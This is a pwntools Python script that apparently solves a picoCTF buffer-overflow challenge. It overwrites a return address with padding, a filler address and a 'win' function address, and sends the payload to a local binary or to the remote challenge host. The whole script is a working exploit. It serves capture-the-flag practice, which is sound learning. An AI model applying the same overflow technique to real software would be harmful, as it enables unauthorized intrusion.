from pwn import *

elf = context.binary = ELF("./vuln", checksec=False)
context.log_level = "debug"

HOST = "foggy-cliff.picoctf.net"
PORT = 57525

win = 0x080492b6
trash = 0x0804c040

payload = b"A"*20 + p32(trash) + p32(win)

def start():
    if args.GDB:
        return gdb.debug([elf.path, payload, b"A"], gdbscript="")
    elif args.REMOTE:
        return remote(HOST, PORT)
    else:
        return process([elf.path, payload, b"A"])

io = start()

if args.REMOTE:
    io.recvline()
    io.sendline(payload + b" " + b"HUHU")

io.interactive()
